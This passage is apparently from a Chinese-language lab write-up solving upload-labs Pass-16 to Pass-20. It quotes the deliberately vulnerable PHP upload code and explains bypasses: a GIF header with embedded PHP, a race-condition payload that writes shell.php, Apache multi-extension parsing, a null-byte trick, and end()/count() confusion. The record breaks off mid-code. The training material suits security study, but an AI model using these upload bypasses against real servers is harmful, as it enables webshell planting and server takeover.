+&lt;p>这里考察的是二次渲染的绕过，用 GIF 绕过会相对比较简单，直接在&lt;code>GIF98a&lt;/code>下面加入 php 代码即可&lt;/p>
+&lt;h3 id="pass-17">Pass-17
+&lt;/h3>&lt;p>比较典型的条件竞争&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;submit&amp;#39;&lt;/span>&lt;span class="p">])){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$ext_arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;jpg&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;png&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;gif&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$file_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$temp_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$file_ext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">substr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file_name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">strrpos&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file_name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;.&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$upload_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">UPLOAD_PATH&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$file_name&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$temp_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$upload_file&lt;/span>&lt;span class="p">)){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">in_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file_ext&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$ext_arr&lt;/span>&lt;span class="p">)){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$img_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">UPLOAD_PATH&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="nx">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">99&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">date&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;YmdHis&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;.&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nv">$file_ext&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">rename&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$upload_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$img_path&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$is_upload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">true&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">unlink&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$upload_file&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;上传出错！&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>从代码看，因为先移动文件到 upload 文件夹然后判断后缀再删除，是可以通过一定的时间差来访问自己上传的文件导致写入 shell 的。可以上传&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="nx">file_put_contents&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;shell.php&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;?php phpinfo();?&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这样只要一次访问成功该 php 文件，即可拿到 shell&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008080.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="pass-18">Pass-18
+&lt;/h3>&lt;p>与17问题类似，在移动后再改名可能被会有条件竞争的漏洞&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// if we are here, we are ready to move the file to destination
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">move&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$ret&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">resultUpload&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$ret&lt;/span> &lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// check if we need to rename the file
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">cls_rename_file&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">renameFile&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$ret&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">resultUpload&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$ret&lt;/span> &lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>讲道理这里我看很多师傅用的是传图片马，但是需要利用到文件包含，而作者意思我觉得肯定不是这样的，否则用竞争来干嘛？直接传个图片马不就好了，反正最后都会返回文件名。&lt;/p>
+&lt;p>这里个人觉得预期解是通过 Apache 解析漏洞来配合条件竞争利用的。&lt;/p>
+&lt;blockquote>
+&lt;p>​ Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。&lt;/p>
+&lt;/blockquote>
+&lt;p>所以我们传个&lt;code>.php.7z&lt;/code>为后缀的文件，再通过条件竞争去访问这个文件就可以写入 shell 了。&lt;/p>
+&lt;h3 id="pass-19">Pass-19
+&lt;/h3>&lt;p>利用&lt;code>pathinfo&lt;/code>的特性绕过&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">pathinfo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/testweb/test.txt/.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">PATHINFO_EXTENSION&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">pathinfo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/testweb/test.php\00.jpg&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">PATHINFO_EXTENSION&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="s2">&amp;#34;jpg&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>当然也可以利用&lt;code>\00&lt;/code>绕过，&lt;code>move_uploaded_file&lt;/code>会忽略后面的&lt;code>.jpg&lt;/code>&lt;/p>
+&lt;h3 id="pass-20">Pass-20
+&lt;/h3>&lt;p>源代码&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$is_upload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">null&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">])){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//检查MIME
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nv">$allow_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;image/jpeg&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;image/png&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;image/gif&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">in_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;type&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="nv">$allow_type&lt;/span>&lt;span class="p">)){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;禁止上传该类型文件!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//检查文件名
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;save_name&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;save_name&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">is_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">explode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$ext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">end&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$allow_suffix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;jpg&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;png&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;gif&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">in_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$ext&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$allow_suffix&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;禁止上传该后缀文件!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$file_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">reset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$file&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$temp_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$img_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">UPLOAD_PATH&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span>&lt;span class="nv">$file_name&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$temp_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$img_path&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;文件上传成功！&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$is_upload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">true&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;文件上传失败！&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;请选择要上传的文件！&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里主要是利用了一个&lt;code>end&lt;/code>与&lt;code>count&lt;/code>的函数特性，根据 php 文档&lt;/p>
+&lt;blockquote>
+&lt;p>​ end&lt;/p>
+&lt;p>(PHP 4, PHP 5, PHP 7)&lt;/p>
+&lt;p>end — 将数组的内部指针指向最后一个单元&lt;/p>
+&lt;p>​ count&lt;/p>
+&lt;p>(PHP 4, PHP 5, PHP 7)&lt;/p>
+&lt;p>count — 计算数组中的单元数目，或对象中的属性个数&lt;/p>
+&lt;/blockquote>
+&lt;p>这里我们就看得更清楚了，&lt;code>end&lt;/code>取的是最后一个元素，无论下标是什么，而&lt;code>count($arr)-1&lt;/code>取的是下标为为最后的元素，例如下面这段代码&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
